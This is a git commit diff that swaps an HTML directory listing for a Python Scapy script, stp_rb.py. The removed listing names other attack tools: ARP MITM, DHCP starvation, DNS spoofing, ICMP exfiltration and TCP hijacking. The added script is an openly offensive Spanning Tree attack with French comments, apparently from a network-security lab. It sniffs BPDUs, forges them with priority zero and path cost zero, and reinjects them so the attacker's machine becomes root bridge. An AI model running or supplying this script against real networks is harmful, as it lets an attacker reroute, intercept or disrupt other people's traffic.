c03e40897ae9156a3d177548fe7b39988e263953
dashboardtobie <132006223+dashboardtobie@users.noreply.github.com>
2024-11-30 23:06:32 +0100

    stp_rb.py

--- stp_rb.py
+++ stp_rb.py
@@ -1,47 +1,45 @@
-<!DOCTYPE HTML>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>Directory listing for /</title>
-</head>
-<body>
-<h1>Directory listing for /</h1>
-<hr>
-<ul>
-<li><a href="arp_mitm.pcapng">arp_mitm.pcapng</a></li>
-<li><a href="arp_mitm.py">arp_mitm.py</a></li>
-<li><a href="arp_poisonning.py">arp_poisonning.py</a></li>
-<li><a href="arp_spoof.pcapng">arp_spoof.pcapng</a></li>
-<li><a href="bin/">bin/</a></li>
-<li><a href="capture_stp.py">capture_stp.py</a></li>
-<li><a href="dernier.py">dernier.py</a></li>
-<li><a href="dhcp_starv.py">dhcp_starv.py</a></li>
-<li><a href="dhcp_starvation.pcapng">dhcp_starvation.pcapng</a></li>
-<li><a href="dhcp_starvation.py">dhcp_starvation.py</a></li>
-<li><a href="dns_cap.py">dns_cap.py</a></li>
-<li><a href="dns_lookup.py">dns_lookup.py</a></li>
-<li><a href="dns_spoof.py">dns_spoof.py</a></li>
-<li><a href="icmp_basic_exfiltr.py">icmp_basic_exfiltr.py</a></li>
-<li><a href="icmp_basic_receiver.py">icmp_basic_receiver.py</a></li>
-<li><a href="icmp_file_exfilter.py">icmp_file_exfilter.py</a></li>
-<li><a href="icmp_file_exfiltration.pcapng">icmp_file_exfiltration.pcapng</a></li>
-<li><a href="icmp_file_receiver.py">icmp_file_receiver.py</a></li>
-<li><a href="include/">include/</a></li>
-<li><a href="lib/">lib/</a></li>
-<li><a href="lib64/">lib64@</a></li>
-<li><a href="mac_add.py">mac_add.py</a></li>
-<li><a href="ping.py">ping.py</a></li>
-<li><a href="pyvenv.cfg">pyvenv.cfg</a></li>
-<li><a href="share/">share/</a></li>
-<li><a href="stp.py">stp.py</a></li>
-<li><a href="stp_rb.py">stp_rb.py</a></li>
-<li><a href="tcp_cap.py">tcp_cap.py</a></li>
-<li><a href="tcp_hijack.py">tcp_hijack.py</a></li>
-<li><a href="tcp_rst.py">tcp_rst.py</a></li>
-<li><a href="test.py">test.py</a></li>
-<li><a href="test2.py">test2.py</a></li>
-<li><a href="yo.py">yo.py</a></li>
-</ul>
-<hr>
-</body>
-</html>
+from scapy.all import *
+from scapy.layers.l2 import Dot3, LLC, STP
+
+def intercept_and_modify_stp(interface):
+    """
+    Capture le trafic STP, modifie les paramètres pour se faire élire Root Bridge,
+    et réinjecte les trames modifiées.
+    Args:
+        interface (str): Interface réseau connectée au switch.
+    """
+    print(f"Listening for STP traffic on {interface}...")
+
+    def modify_and_send(packet):
+        """
+        Modifie les paramètres du BPDU pour devenir Root Bridge et réinjecte la trame.
+        Args:
+            packet: La trame BPDU capturée.
+        """
+        if packet.haslayer(STP):
+            print(f"Captured BPDU: {packet.summary()}")
+            
+            # Modifier les paramètres pour devenir Root Bridge
+            forged_packet = packet.copy()
+            forged_packet[STP].root_id = f"0000{packet[STP].root_id[4:]}"  # Abaisser la priorité à 0x0000
+            forged_packet[STP].bridge_id = f"0000{packet[STP].bridge_id[4:]}"  # Priorité très basse
+            forged_packet[STP].root_path_cost = 0  # Chemin direct
+
+            print(f"Forged BPDU: {forged_packet.summary()}")
+            
+            # Réinjecter la trame forgée
+            sendp(forged_packet, iface=interface, verbose=False)
+            print("Injected forged BPDU into the network.")
+
+    # Capture en continu des trames STP et les modifie
+    sniff(iface=interface, filter="ether dst 01:80:c2:00:00:00", prn=modify_and_send)
+
+if __name__ == "__main__":
+    import sys
+
+    if len(sys.argv) != 2:
+        print("Usage: python stp_intercept_modify.py <interface>")
+        sys.exit(1)
+
+    interface = sys.argv[1]
+    intercept_and_modify_stp(interface)
